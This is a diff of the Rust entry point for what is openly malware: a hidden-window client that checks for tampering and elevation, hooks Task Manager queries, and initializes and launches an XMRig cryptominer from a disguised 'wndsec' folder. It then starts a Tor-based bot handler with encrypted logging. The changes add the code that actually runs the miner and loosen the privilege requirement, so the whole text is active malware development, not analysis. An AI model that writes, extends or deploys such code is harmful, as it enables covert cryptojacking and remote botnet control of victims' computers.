@@ -1,16 +1,20 @@
 #![windows_subsystem = "windows"]
 
-use std::sync::Mutex;
-use client_vars::constants::log_directory;
-use miner::utils::initialize_miner;
+use std::{ sync::Mutex, time::Duration };
+use client_vars::constants::{ log_directory, xmrig_exe_name };
+use miner::{ run::run_miner, utils::initialize_miner };
 use network::tor::BotHandler;
 use obfstr::obfstr as s;
 use shared::{
     constants::logs_encryption_key,
     logs::logger::Logger,
     network::tor::LoggerCnfg,
-    uac::checks::is_system,
-    utils::{ anti_tampering::is_clean, config::load_mib_config, functions::exit_1 },
+    uac::checks::{ is_elevated, is_system },
+    utils::{
+        anti_tampering::is_clean,
+        config::load_mib_config,
+        functions::{ exit_1, get_current_exe_dir },
+    },
 };
 use lazy_static::lazy_static;
 use tasks::task_manager_hook::run_query_hooker;
@@ -115,7 +119,7 @@ async fn main() {
     if !is_clean() {
         exit_1();
     }
-    if !is_system().unwrap_or(false) {
+    if !is_elevated().unwrap_or(false) {
         exit_1();
     }
 
@@ -144,12 +148,30 @@ async fn main() {
     if let Err(error) = initialize_miner() {
         err!("initialize_miner failed: ", error);
     }
+    std::thread::sleep(Duration::from_millis(500));
 
-    let config = LoggerCnfg::Existing(LOGGER.lock().unwrap().clone());
+    let miner_file_path = get_current_exe_dir()
+        .unwrap()
+        .join(s!("wndsec"))
+        .join(xmrig_exe_name())
+        .to_str()
+        .unwrap()
+        .to_owned();
+
+    if let Err(error) = run_miner(&miner_file_path) {
+        err!("run_miner failed: ", error);
+    }
+
+    let config = LoggerCnfg::New { log_dir: log_directory(), log_enc_key: logs_encryption_key() };
+    info!("LoggerCnfg made");
+
     if let Ok(mut bot_handler) = BotHandler::new(config).await {
+        info!("starting run_handler");
+
         bot_handler.run_handler().await;
-    };
+        warn!("ENDED??");
+    }
+    warn!("END");
 }
 
-// add mutexes IN client - loader mainly run as service  - client - mutex by version
 // add error in terminal collecting
